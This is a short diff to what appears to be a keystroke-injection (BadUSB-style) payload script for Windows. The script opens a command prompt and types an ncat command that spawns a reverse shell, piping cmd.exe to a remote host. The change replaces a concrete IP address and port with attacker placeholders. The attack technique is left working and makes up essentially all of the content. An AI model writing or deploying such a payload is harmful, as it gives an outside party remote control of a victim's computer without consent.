@@ -25,7 +25,7 @@ DELAY 950
 STRING cmd.exe
 ENTER
 DELAY 950
-STRING C:/test/ncat.exe 70.34.251.2 8080 -e cmd.exe
+STRING C:/test/ncat.exe <Attacker_IP> <PORT> -e cmd.exe
 DELAY 2000
 ENTER
 WINDOWS DOWN
